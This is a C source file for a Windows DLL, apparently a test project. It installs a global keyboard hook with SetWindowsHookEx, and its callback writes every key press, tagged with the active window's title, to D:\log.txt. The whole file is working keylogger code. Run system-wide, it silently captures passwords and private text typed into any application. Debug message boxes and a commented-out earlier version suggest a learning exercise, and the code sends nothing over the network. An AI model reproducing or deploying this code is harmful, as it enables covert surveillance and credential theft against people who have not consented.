#include "testDll.h"

BOOL InstallHook()
{
	g_hook = SetWindowsHookEx(WH_KEYBOARD, KeyBoard, GetModuleHandle(L"testDll2"), 0);
	if (g_hook==NULL)
	{
		return FALSE;
	}
	MessageBox(NULL, L"ok1", NULL, NULL);
	return TRUE;
}

BOOL UnInstallHook()
{

	return UnhookWindowsHookEx(g_hook);
}

LRESULT CALLBACK KeyBoard(int ncode, WPARAM wParam, LPARAM lParam)
{
	HWND hWnd = GetActiveWindow();
	if (hWnd==NULL)
	{
		hWnd = GetForegroundWindow();
		if (hWnd==NULL)
		{
			return CallNextHookEx(g_hook, ncode, wParam, lParam);
		}
	}
	char szWindowtitle[MAX_PATH] = {0};
	GetWindowTextA(hWnd, szWindowtitle, MAX_PATH);
	if (ncode<0 || ncode==HC_NOREMOVE)
	{
		return CallNextHookEx(g_hook, ncode, wParam, lParam);
	}
	if (lParam & 0x40000000)
	{
		return CallNextHookEx(g_hook, ncode, wParam, lParam);
	}
	char keyName[255] = {0};
	GetKeyNameTextA(lParam, keyName, 255);
	FILE *fp;
	errno_t err;
	err = fopen_s(&fp, "D:\\log.txt", "a+");
	if (err != 0)
	{
		MessageBox(NULL, L"ok", NULL, NULL);
		return CallNextHookEx(g_hook, ncode, wParam, lParam);
	}
	char szText[256] = {0};
	sprintf_s(szText, sizeof(szText),"%s:%s\r\n",szWindowtitle,keyName);
	//sprintf(szText, "%s:%s\n", szWindowtitle, keyName);
	fwrite(szText, 1, strlen(szText), fp);
	fclose(fp);
	//FILE *fp = fopen("D:\\log.txt", "a");
	//if (fp==NULL)
	//{
	//	return CallNextHookEx(g_hook, ncode, wParam, lParam);
	//}
	//char szText[512];
	//sprintf_s(szText, sizeof(szText), "%s:%s\r\n", szWindowtitle, keyName);
	////sprintf(szText, "%s:%s\r\n", szWindowtitle, keyName);
	//fwrite(szText, 1, sizeof(szText), fp);
	//fclose(fp);
	return CallNextHookEx(g_hook, ncode, wParam, lParam);
}
